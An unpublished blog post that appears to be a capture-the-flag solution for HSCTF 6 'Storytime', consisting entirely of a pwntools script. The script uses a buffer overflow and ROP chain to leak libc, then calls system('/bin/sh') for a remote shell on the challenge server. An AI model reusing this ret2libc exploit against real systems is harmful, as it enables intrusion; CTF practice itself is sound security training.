---
layout: post
published: false
title: 'HSCTF 6: Storytime'
---
{% highlight python %}
#Completed
from pwn import *

#p = process("./storytime")
elf = ELF("./storytime")
rop = ROP(elf)


WRITE = elf.plt["write"]
libc_start_main = elf.symbols['__libc_start_main']
climax = 0x000000000040060e


log.info("write@plt: " + hex(WRITE))
log.info("climax address: " + hex(climax))
log.info("__libc_start_main: " + hex(libc_start_main))

padding = "A"*56
ROP_RDI = (rop.find_gadget(["pop rdi", "ret"]))[0]
ROP_RSI = (rop.find_gadget(['pop rsi', 'pop r15', 'ret']))[0] #don't understand
payload = padding + p64(ROP_RDI) + p64(0x1) + p64(ROP_RSI) + p64(libc_start_main) + p64(0x1) + p64(WRITE) + p64(climax) #+ p64(MAIN) 

rm = remote("pwn.hsctf.com", 3333)

#send payload 1
rm.sendline(payload)

rm.recvuntil('story:')

leak = u64(rm.recv()[0:8].strip().ljust(8, '\x00'))

log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))

libc = ELF('libc.so.6')
libc.address = leak -libc.sym['__libc_start_main']
log.info("Address of libc %s " % hex(libc.address))

#Doan nay giong bai truoc (Combo Chain Lite)
BINSH = next(libc.search("/bin/sh"))
SYSTEM = libc.sym['system']

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

payload2 = padding + p64(ROP_RDI) + p64(BINSH) + p64(SYSTEM)
rm.sendline(payload2)

rm.interactive()
rm.close()
{% endhighlight %}
